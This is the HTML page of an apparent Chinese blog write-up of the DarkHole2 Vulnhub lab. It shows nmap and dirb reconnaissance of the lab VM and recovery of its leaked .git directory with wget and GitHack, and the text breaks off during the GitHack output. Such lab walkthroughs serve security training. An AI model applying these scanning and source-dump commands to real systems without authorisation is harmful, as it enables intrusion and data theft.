@@ -1,0 +1,724 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="大二开学第一个vulnhub靶场"><title>DarkHole2.0 Vulunhub靶场复现</title><link rel=canonical href=https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="DarkHole2.0 Vulunhub靶场复现"><meta property='og:description' content="大二开学第一个vulnhub靶场"><meta property='og:url' content='https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-09-19T00:00:00+00:00'><meta property='article:modified_time' content='2026-09-19T00:00:00+00:00'><meta name=twitter:title content="DarkHole2.0 Vulunhub靶场复现"><meta name=twitter:description content="大二开学第一个vulnhub靶场"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描与漏洞探测>端口扫描与漏洞探测</a></li><li><a href=#web-服务探测>Web 服务探测</a></li><li><a href=#端口扫描>端口扫描</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#使用-githack-对泄露的-git-目录进行下载>使用 GitHack 对泄露的 .git 目录进行下载</a></li><li><a href=#为什么能直接访问-git目录还需要使用-githack-等工具下载>为什么能直接访问 .git目录，还需要使用 GitHack 等工具下载？</a></li><li><a href=#为什么后面又转头选择了-wget-下载目录>为什么后面又转头选择了 wget 下载目录</a></li><li><a href=#那为什么-githack-和-可访问的git-目录不一样呢以及为什么没有git文件夹>那为什么 githack 和 可访问的.git 目录不一样呢，以及为什么没有.git文件夹？</a></li><li><a href=#wget-获取git目录>wget 获取.git目录</a></li><li><a href=#为什么-wget-下载后只有-git-文件夹没有源码文件>为什么 wget 下载后只有 .git 文件夹，没有源码文件？</a></li><li><a href=#回到80端口拿着获取的账号密码去登陆>回到80端口，拿着获取的账号密码去登陆</a></li><li><a href=#审计源码寻找漏洞>审计源码寻找漏洞</a><ol><li><a href=#sql-注入点dashboardphp-的-mobile-参数>SQL 注入点：<code>dashboard.php</code> 的 <code>mobile</code> 参数</a></li></ol></li><li><a href=#利用-burp-和-sqlmap-进行-sql-注入>利用 Burp 和 sqlmap 进行 SQL 注入</a></li></ol></li><li><a href=#ssh-登陆-jehad账户>SSH 登陆 jehad账户</a><ol><li><a href=#在jehad用户权限上信息信息收集>在jehad用户权限上信息信息收集</a></li><li><a href=#尝试sudo和suid提权无果>尝试sudo和suid提权无果</a></li><li><a href=#计划任务提权尝试>计划任务提权尝试</a></li><li><a href=#本地服务枚举>本地服务枚举</a></li><li><a href=#查看9999端口进程>查看9999端口进程</a></li><li><a href=#验证命令执行>验证命令执行</a></li><li><a href=#读-losy-的-bash_history>读 losy 的 .bash_history</a></li></ol></li><li><a href=#先切换到losy账户获取user-flag>先切换到losy账户,获取user flag</a></li><li><a href=#提权至root获取rootflag>提权至root,获取rootflag</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/>DarkHole2.0 Vulunhub靶场复现</a></h2><h3 class=article-subtitle>大二开学第一个vulnhub靶场</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-09-19T00:00:00Z>Saturday, September 19, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描与漏洞探测>端口扫描与漏洞探测</a></li><li><a href=#web-服务探测>Web 服务探测</a></li><li><a href=#端口扫描>端口扫描</a></li></ol></li><li><a href=#漏洞发现及其利用>漏洞发现及其利用</a><ol><li><a href=#使用-githack-对泄露的-git-目录进行下载>使用 GitHack 对泄露的 .git 目录进行下载</a></li><li><a href=#为什么能直接访问-git目录还需要使用-githack-等工具下载>为什么能直接访问 .git目录，还需要使用 GitHack 等工具下载？</a></li><li><a href=#为什么后面又转头选择了-wget-下载目录>为什么后面又转头选择了 wget 下载目录</a></li><li><a href=#那为什么-githack-和-可访问的git-目录不一样呢以及为什么没有git文件夹>那为什么 githack 和 可访问的.git 目录不一样呢，以及为什么没有.git文件夹？</a></li><li><a href=#wget-获取git目录>wget 获取.git目录</a></li><li><a href=#为什么-wget-下载后只有-git-文件夹没有源码文件>为什么 wget 下载后只有 .git 文件夹，没有源码文件？</a></li><li><a href=#回到80端口拿着获取的账号密码去登陆>回到80端口，拿着获取的账号密码去登陆</a></li><li><a href=#审计源码寻找漏洞>审计源码寻找漏洞</a><ol><li><a href=#sql-注入点dashboardphp-的-mobile-参数>SQL 注入点：<code>dashboard.php</code> 的 <code>mobile</code> 参数</a></li></ol></li><li><a href=#利用-burp-和-sqlmap-进行-sql-注入>利用 Burp 和 sqlmap 进行 SQL 注入</a></li></ol></li><li><a href=#ssh-登陆-jehad账户>SSH 登陆 jehad账户</a><ol><li><a href=#在jehad用户权限上信息信息收集>在jehad用户权限上信息信息收集</a></li><li><a href=#尝试sudo和suid提权无果>尝试sudo和suid提权无果</a></li><li><a href=#计划任务提权尝试>计划任务提权尝试</a></li><li><a href=#本地服务枚举>本地服务枚举</a></li><li><a href=#查看9999端口进程>查看9999端口进程</a></li><li><a href=#验证命令执行>验证命令执行</a></li><li><a href=#读-losy-的-bash_history>读 losy 的 .bash_history</a></li></ol></li><li><a href=#先切换到losy账户获取user-flag>先切换到losy账户,获取user flag</a></li><li><a href=#提权至root获取rootflag>提权至root,获取rootflag</a></li></ol></nav></details></aside><section class=article-content><h1 id=darkhole2-vulunhub靶场复现>DarkHole2 Vulunhub靶场复现</h1><h2 id=靶场介绍>靶场介绍</h2><p>靶场地址 <a class=link href=https://www.vulnhub.com/entry/darkhole-2,740/ target=_blank rel=noopener>https://www.vulnhub.com/entry/darkhole-2,740/</a></p><p>介绍如下</p><p>Difficulty:Hard</p><p>This works better with VMware rather than VirtualBox</p><p>Hint: Don&rsquo;t waste your time For Brute-Force</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>靶机ip为10.10.10.138</p><h3 id=端口扫描与漏洞探测>端口扫描与漏洞探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.137 
+</span></span></code></pre></td></tr></table></div></div><p>只开放 22 ssh 端口和 80 http 服务端口，接下来仔细扫描一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -p22,80 -sS -A 10.10.10.138
+</span></span></code></pre></td></tr></table></div></div><p>结果如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: DarkHole V2
+</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> http-git: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   10.10.10.138:80/.git/
+</span></span><span class=line><span class=cl><span class=p>|</span>     Git repository found!
+</span></span><span class=line><span class=cl><span class=p>|</span>     Repository description: Unnamed repository<span class=p>;</span> edit this file <span class=s1>&#39;description&#39;</span> to name the...
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Last commit message: i changed login.php file <span class=k>for</span> more secure 
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>标题/版本</th><th>备注</th></tr></thead><tbody><tr><td>22</td><td>SSH (OpenSSH 8.2p1)</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</td><td>登录入口，远程管理</td></tr><tr><td>80</td><td>HTTP (Apache httpd 2.4.41)</td><td>DarkHole V2 / Apache 2.4.41 (Ubuntu)</td><td>Web 入口；存在 <code>.git</code> 泄露；PHPSESSID 未设 HttpOnly；最后提交涉及 <code>login.php</code></td></tr></tbody></table></div><p>再使用nmap的漏洞脚本扫描一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap --script<span class=o>=</span>vuln -p22,80 10.10.10.138
+</span></span></code></pre></td></tr></table></div></div><p>扫描结果为：<code>/config/</code> 可列目录；PHPSESSID 缺 HttpOnly；可能存在 CSRF</p><h3 id=web-服务探测>Web 服务探测</h3><p>对80端口进行访问</p><p>有两个按钮分别是 View Datils ,点击没用，有一个 login 点击跳转 /login.php</p><p>看来目前方向80端口的web入口，优先级是看看 .git 泄露</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo dirb http://10.10.10.138 
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>路径/URL</th><th>类型</th><th>状态/发现</th><th>为什么有用</th></tr></thead><tbody><tr><td><code>/.git/HEAD</code></td><td>Git 源码泄露</td><td>200，SIZE 23；确认 Git 仓库存在</td><td>可恢复源码、提交历史、配置、硬编码凭据</td></tr><tr><td><code>/config/</code></td><td>敏感目录</td><td>目录可列</td><td>可能泄露数据库密码、密钥、应用配置</td></tr><tr><td><code>/js/</code></td><td>JS 目录</td><td>目录可列</td><td>可能泄露接口、密钥、隐藏路径、前端逻辑</td></tr><tr><td><code>/login.php</code></td><td>登录入口</td><td>nmap 发现；本次目录扫描未列出</td><td>认证突破口，可能有弱口令、SQL 注入、CSRF</td></tr><tr><td><code>/server-status</code></td><td>Apache 状态页</td><td>403</td><td>可能泄露请求信息，但当前被拒绝访问</td></tr></tbody></table></div><h2 id=漏洞发现及其利用>漏洞发现及其利用</h2><h3 id=使用-githack-对泄露的-git-目录进行下载>使用 GitHack 对泄露的 .git 目录进行下载</h3><p>针对 .git 泄露，此前在 CTF 中遇到过类似题型。可以使用 GitHack 或 git-dumper 这两个开源工具，它们能下载并解析 .git 数据，恢复成正常的项目源码目录。</p><ul><li>工具链接：<a class=link href=https://github.com/lijiejie/GitHack target=_blank rel=noopener>lijiejie/GitHack</a></li><li>工具链接：<a class=link href=https://github.com/arthaud/git-dumper target=_blank rel=noopener>arthaud/git-dumper</a></li></ul><p>这里分别演示 git clone 和 GitHack 的结果。最后发现，我演示的是歪路。后面有对这个问题的补充</p><p>使用 wget 的命令如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>wget -r -np -nH http://10.10.10.138/.git/
+</span></span></code></pre></td></tr></table></div></div><p>当然，可以尝试一下 git clone，不过这里不行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>D:</span><span class=p>\</span><span class=n>Ke1th_Labs</span><span class=p>\</span><span class=n>Vulnhub</span><span class=p>\</span><span class=n>Darkhole_2</span><span class=p>\</span><span class=n>git</span> <span class=n>give</span> <span class=n>away</span><span class=p>&gt;</span> <span class=n>git</span> <span class=n>clone</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=mf>138</span><span class=p>/.</span><span class=n>git</span><span class=p>/</span>
+</span></span><span class=line><span class=cl><span class=n>Cloning</span> <span class=n>into</span> <span class=s1>&#39;10.10.10.138&#39;</span><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=n>fatal</span><span class=err>:</span> <span class=n>repository</span> <span class=s1>&#39;http://10.10.10.138/.git/&#39;</span> <span class=n>not</span> <span class=n>found</span>
+</span></span></code></pre></td></tr></table></div></div><p>原因分析：git clone 需要服务器支持 Smart HTTP 协议，而靶机这里只是单纯的静态文件泄露（Dumb HTTP），因此无法直接 clone。</p><p>转而使用 GitHack：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>E:</span><span class=p>\</span><span class=n>Tools</span><span class=p>\</span><span class=n>GitHack</span><span class=p>&gt;</span> <span class=n>python</span> <span class=n>GitHack</span><span class=p>.</span><span class=py>py</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=mf>138</span><span class=p>/.</span><span class=n>git</span><span class=p>/</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>Download</span> <span class=n>and</span> <span class=n>parse</span> <span class=n>index</span> <span class=n>file</span> <span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/.</span><span class=py>gitignore</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/</span><span class=n>darkhole_2</span><span class=p>.</span><span class=py>iml</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/</span><span class=n>modules</span><span class=p>.</span><span class=py>xml</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>config</span><span class=p>/</span><span class=n>config</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>dashboard</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>index</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>js</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=py>js</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>login</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>logout</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>style</span><span class=p>/</span><span class=n>dashboard</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>style</span><span class=p>/</span><span class=n>home</span><span class=p>.</span><span class=py>jpg</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>style</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>style</span><span class=p>/</span><span class=n>login</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>style</span><span class=p>/</span><span class=n>login</span><span class=p>.</span><span class=py>jpg</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Error] [WinError 183</span><span class=p>]</span> <span class=n>当文件已存在时</span><span class=err>，</span><span class=n>无法创建该文件</span><span class=err>。:</span> <span class=s1>&#39;10.10.10.138\\.idea&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/</span><span class=n>modules</span><span class=p>.</span><span class=py>xml</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/.</span><span class=py>gitignore</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>config</span><span class=p>/</span><span class=n>config</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>dashboard</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>index</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>js</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=py>js</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=p>.</span><span class=n>idea</span><span class=p>/</span><span class=n>darkhole_2</span><span class=p>.</span><span class=py>iml</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>logout</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>login</span><span class=p>.</span><span class=py>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>style</span><span class=p>/</span><span class=n>dashboard</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>style</span><span class=p>/</span><span class=n>index</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>style</span><span class=p>/</span><span class=n>login</span><span class=p>.</span><span class=py>css</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>style</span><span class=p>/</span><span class=n>home</span><span class=p>.</span><span class=py>jpg</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>OK</span><span class=p>]</span> <span class=n>style</span><span class=p>/</span><span class=n>login</span><span class=p>.</span><span class=py>jpg</span>
